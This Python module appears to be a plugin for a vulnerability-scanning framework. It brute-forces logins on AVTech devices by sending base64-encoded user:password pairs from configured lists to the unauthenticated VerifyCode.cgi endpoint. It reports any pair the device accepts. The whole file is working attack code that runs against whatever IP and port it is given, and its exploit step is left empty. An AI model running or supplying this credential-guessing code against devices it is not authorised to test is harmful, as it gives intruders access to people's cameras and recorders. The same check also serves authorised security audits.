import base64

import requests
from loguru import logger

from .base import POCTemplate


class AVTechWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['avtech']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = 'AVTech 弱口令'

    def verify(self, ip, port=80):
        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
        for user in self.config.users:
            for password in self.config.passwords:
                account = base64.b64encode(f"{user}:{password}".encode('utf8')).decode()
                url = f"http://{ip}:{port}/cgi-bin/nobody/VerifyCode.cgi?account={account}"
                try:
                    r = requests.get(url, headers=headers, verify=False, timeout=self.config.timeout)
                    if r.status_code == 200:
                        if r.text.split('\n')[1] == 'OK':
                            return ip, str(port), self.product, user, password, self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(AVTechWeakPassword)